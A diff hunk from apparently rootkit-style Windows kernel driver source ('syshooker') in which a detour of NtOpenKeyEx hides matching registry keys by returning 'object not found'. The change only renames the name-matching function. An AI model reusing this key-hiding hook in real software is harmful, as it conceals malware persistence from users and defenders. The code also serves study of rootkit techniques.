@@ -36,7 +36,7 @@ NTSTATUS DetourNtOpenKeyEx(
 			// if L'\\' was not found, pass the whole ObjectName to the matching function
 			// otherwise pass the remaining string AFTER the last backslash
 			// in other words - the extracted registry key
-			if (matchMagicNames(LastBackslash == nullptr ? ObjectName : LastBackslash + 1, (Target)TARGET_REGISTRY)) {
+			if (matchSyshookerNames(LastBackslash == nullptr ? ObjectName : LastBackslash + 1, (Target)TARGET_REGISTRY)) {
 				kprintf("[+] syshooker: NtOpenKeyEx: hiding %ws\n", ObjectName);
 				ExFreePool(ObjectName);
 				return STATUS_OBJECT_NAME_NOT_FOUND;
